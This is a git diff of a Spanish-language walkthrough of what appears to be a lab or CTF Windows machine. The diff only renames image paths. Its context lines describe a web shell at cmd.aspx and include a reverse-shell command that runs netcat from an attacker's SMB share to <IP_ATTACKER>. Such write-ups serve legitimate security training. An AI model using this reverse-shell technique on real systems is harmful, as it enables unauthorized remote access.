@@ -111,7 +111,7 @@ Finished
 
 No vemos nada interesante, pero si vemos mejor en la pagina web principal, veremos lo siguiente:
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que hay varios nombres de usuario en los cuales se estan nombrando sobre las gracias de la pagina, por lo que nos montaremos una lista de usuarios.
 
@@ -176,15 +176,15 @@ Vemos que la contraseña de dicho usuario a `expirado` al parecer por una config
 
 Tendremos que sacarnos un teclado virtual dentro de la maquina de `Windows`:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Pulsamos `3` teclas, que serian `Ctrl+Alt+Supr` para poder desbloquear la pantalla de bloqueo de `Windows`, le daremos varias veces al boton `ESC` para ir a este menu:
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Seleccionaremos el usuario `bogo` e ingresaremos la contraseña `bogo`, cuando la metamos pondra lo siguiente:
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Le daremos `Aceptar` y pondremos la misma contraseña `bogo` para dejarlo como estaba, una vez echo todo esto, ya habremos actualizado la contraseña, por lo que si volvemos a lanzar el `NetExec` veremos lo siguiente:
 
@@ -417,7 +417,7 @@ Ahora si nos vamos a la siguiente `URL` veremos que efectivamente esta la pagina
 URL = http://<IP>/cmd.aspx
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que esta funcionando de forma correcta, por lo que vamos a crearnos una `reverse shell` abriendo un servidor de `SMB` para poder ejecutar `netcat` desde dicho servidor.
 
@@ -453,7 +453,7 @@ Ahora lo que vamos hacer desde la pagina del `cmd.aspx` sera lo siguiente:
 //<IP_ATTACKER>/kali/nc.exe -e cmd <IP_ATTACKER> <PORT>
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Antes de ejecutar el comando, vamos ponernos a la escucha de la siguiente forma:
 
